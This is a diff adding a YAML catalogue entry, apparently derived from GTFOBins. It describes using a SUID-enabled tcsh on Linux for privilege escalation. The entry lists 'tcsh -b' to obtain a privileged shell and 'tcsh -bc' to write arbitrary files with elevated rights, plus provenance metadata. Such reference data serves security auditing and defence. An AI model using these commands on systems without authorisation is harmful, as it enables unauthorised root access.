@@ -1,0 +1,85 @@
+id: gtfobins/tcsh/shell/suid
+type: binary
+platform: linux
+name: tcsh
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: GPL-3.0
+  upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+  last_synced: '2026-11-13'
+commands:
+- template: tcsh -b
+references:
+- https://gtfobins.github.io/gtfobins/tcsh/
+tags:
+- linux
+- unix
+- gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      documents:
+        tcsh:
+          functions:
+            file-write:
+            - code: tcsh -c 'echo DATA >/path/to/output-file'
+              contexts:
+                sudo: null
+                suid:
+                  code: tcsh -bc 'echo DATA >/path/to/output-file'
+                unprivileged: null
+            shell:
+            - code: tcsh
+              contexts:
+                sudo: null
+                suid:
+                  code: tcsh -b
+                unprivileged: null
+    upstream_url: https://gtfobins.github.io/gtfobins/tcsh/
+    upstream_version: acd524623f9c406acedd2754ebd9c2431f3675ad
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: shell
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+  privilege_required:
+    value: suid
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd524623f9c406acedd2754ebd9c2431f3675ad
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    GTFOBins: sha256:01d7dd8610cc80c2d33e59ec9ea0c54ff051b8772274294cde1ef1cf598dfcfb
